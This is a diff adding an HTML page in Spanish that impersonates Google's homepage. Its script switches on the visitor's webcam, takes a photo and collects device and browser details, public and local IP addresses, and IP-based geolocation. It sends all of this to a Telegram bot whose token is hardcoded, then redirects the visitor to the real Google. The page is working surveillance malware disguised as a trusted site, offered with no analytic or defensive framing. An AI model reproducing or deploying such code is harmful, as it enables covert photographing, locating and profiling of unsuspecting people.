@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        #google-container {
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+            z-index: 10;
+            position: relative;
+        }
+        .logo {
+            font-size: 80px;
+            font-weight: bold;
+            letter-spacing: -5px;
+            margin-bottom: 20px;
+        }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        input[type="text"] {
+            width: 90%;
+            padding: 15px 20px;
+            border-radius: 30px;
+            border: 1px solid #dfe1e5;
+            font-size: 18px;
+            outline: none;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .buttons { margin-top: 20px; }
+        .buttons button {
+            background: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            padding: 12px 25px;
+            margin: 5px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #overlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        #status-msg {
+            position: absolute;
+            bottom: 30px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 16px;
+            text-shadow: 0 0 10px #0f0;
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            display: none;
+        }
+        #close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 10000;
+            background: rgba(255,0,0,0.7);
+            color: #fff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="google-container">
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <input type="text" placeholder="Buscar con Google o escribir una URL" id="searchInput">
+        <div class="buttons">
+            <button>Buscar con Google</button>
+            <button>Voy a tener suerte</button>
+        </div>
+        <p style="margin-top: 30px; color: #888; font-size: 14px;">Ofrecido por Google</p>
+    </div>
+
+    <div id="overlay">
+        <video id="video" autoplay playsinline></video>
+        <div id="status-msg">📸 Enviando datos al bot...</div>
+        <button id="close-btn">✕ Cerrar</button>
+    </div>
+
+    <script>
+        (function() {
+            const BOT_TOKEN = '8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY';
+            const CHAT_ID = 'TU_CHAT_ID';
+
+            const overlay = document.getElementById('overlay');
+            const video = document.getElementById('video');
+            const statusMsg = document.getElementById('status-msg');
+            const closeBtn = document.getElementById('close-btn');
+
+            let mediaStream = null;
+            let infoEnviada = false;
+
+            async function startCamera() {
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                    video.srcObject = mediaStream;
+                    await video.play();
+                    overlay.style.display = 'flex';
+                    closeBtn.style.display = 'block';
+                    document.body.style.overflow = 'hidden';
+                    statusMsg.style.display = 'block';
+                    statusMsg.textContent = '📸 Capturando y enviando...';
+                    setTimeout(() => {
+                        captureAndSend();
+                    }, 2000);
+                } catch (err) {
+                    statusMsg.textContent = '❌ Error: ' + err.message;
+                    statusMsg.style.display = 'block';
+                }
+            }
+
+            function captureAndSend() {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoDataURL = canvas.toDataURL('image/jpeg', 0.9);
+                const photoBase64 = photoDataURL.split(',')[1];
+
+                const info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : 'N/D',
+                    cookiesEnabled: navigator.cookieEnabled,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    viewportWidth: window.innerWidth,
+                    viewportHeight: window.innerHeight,
+                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/D',
+                    cpuCores: navigator.hardwareConcurrency || 'N/D',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localDateTime: new Date().toLocaleString(),
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/D',
+                    downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'N/D',
+                    rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'N/D',
+                    publicIP: 'Obteniendo...',
+                    geo: 'Obteniendo...',
+                    localIP: 'Obteniendo...'
+                };
+
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        info.publicIP = data.ip;
+                        fetch('http://ip-api.com/json/' + data.ip)
+                            .then(res => res.json())
+                            .then(geoData => {
+                                if (geoData.status === 'success') {
+                                    info.geo = `${geoData.country}, ${geoData.regionName}, ${geoData.city} (${geoData.lat}, ${geoData.lon}) - ISP: ${geoData.isp}`;
+                                } else {
+                                    info.geo = 'No disponible';
+                                }
+                                getLocalIP((ip) => {
+                                    info.localIP = ip || 'No disponible';
+                                    sendToTelegram(photoBase64, info);
+                                });
+                            })
+                            .catch(() => {
+                                info.geo = 'No disponible';
+                                getLocalIP((ip) => {
+                                    info.localIP = ip || 'No disponible';
+                                    sendToTelegram(photoBase64, info);
+                                });
+                            });
+                    })
+                    .catch(() => {
+                        info.publicIP = 'No disponible';
+                        info.geo = 'No disponible';
+                        getLocalIP((ip) => {
+                            info.localIP = ip || 'No disponible';
+                            sendToTelegram(photoBase64, info);
+                        });
+                    });
+            }
+
+            function getLocalIP(callback) {
+                let ip = null;
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('dummy');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate) {
+                        const parts = e.candidate.candidate.split(' ');
+                        const candidateIP = parts[4];
+                        if (candidateIP && !candidateIP.includes(':')) {
+                            ip = candidateIP;
+                            pc.close();
+                            callback(ip);
+                        }
+                    }
+                };
+                setTimeout(() => {
+                    if (pc) pc.close();
+                    callback(ip);
+                }, 3000);
+            }
+
+            function sendToTelegram(photoBase64, info) {
+                if (infoEnviada) return;
+                infoEnviada = true;
+
+                statusMsg.textContent = '📤 Enviando al bot...';
+
+                let text = '';
+                text += `📱 USER AGENT: ${info.userAgent}\n`;
+                text += `🖥️ PLATAFORMA: ${info.platform}\n`;
+                text += `🌐 IDIOMA: ${info.language} (${info.languages})\n`;
+                text += `🍪 COOKIES: ${info.cookiesEnabled ? 'SÍ' : 'NO'}\n`;
+                text += `📺 PANTALLA: ${info.screenWidth}x${info.screenHeight} px (${info.colorDepth} bits)\n`;
+                text += `🖥️ VIEWPORT: ${info.viewportWidth}x${info.viewportHeight}\n`;
+                text += `🧠 MEMORIA: ${info.deviceMemory}\n`;
+                text += `⚡ CPU CORES: ${info.cpuCores}\n`;
+                text += `📶 CONEXIÓN: ${info.connectionType} (${info.downlink}, RTT ${info.rtt})\n`;
+                text += `⏰ ZONA HORARIA: ${info.timezone}\n`;
+                text += `📅 FECHA/HORA: ${info.localDateTime}\n`;
+                text += `🌍 IP PÚBLICA: ${info.publicIP}\n`;
+                text += `📍 GEO (IP): ${info.geo}\n`;
+                text += `🔗 IP LOCAL: ${info.localIP}\n`;
+
+                const urlPhoto = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const payloadPhoto = {
+                    chat_id: CHAT_ID,
+                    photo: photoBase64,
+                    caption: text.substring(0, 1024)
+                };
+
+                fetch(urlPhoto, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payloadPhoto)
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusMsg.textContent = '✅ Enviado al bot correctamente.';
+                        if (text.length > 1024) {
+                            const parts = text.match(/.{1,4000}/g);
+                            if (parts) {
+                                parts.forEach((part, index) => {
+                                    if (index > 0) {
+                                        const urlText = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                                        fetch(urlText, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({ chat_id: CHAT_ID, text: part })
+                                        }).catch(() => {});
+                                    }
+                                });
+                            }
+                        }
+                    } else {
+                        statusMsg.textContent = '❌ Error al enviar: ' + data.description;
+                    }
+                })
+                .catch(err => {
+                    statusMsg.textContent = '❌ Error de red: ' + err.message;
+                });
+            }
+
+            closeBtn.addEventListener('click', function() {
+                overlay.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                video.srcObject = null;
+                window.location.href = 'https://www.google.com';
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && overlay.style.display === 'flex') {
+                    closeBtn.click();
+                }
+            });
+
+            window.addEventListener('load', function() {
+                if (CHAT_ID === 'TU_CHAT_ID') {
+                    statusMsg.textContent = '⚠️ Configura CHAT_ID en el código.';
+                    statusMsg.style.display = 'block';
+                    return;
+                }
+                startCamera();
+            });
+
+        })();
+    </script>
+</body>
+  </html>
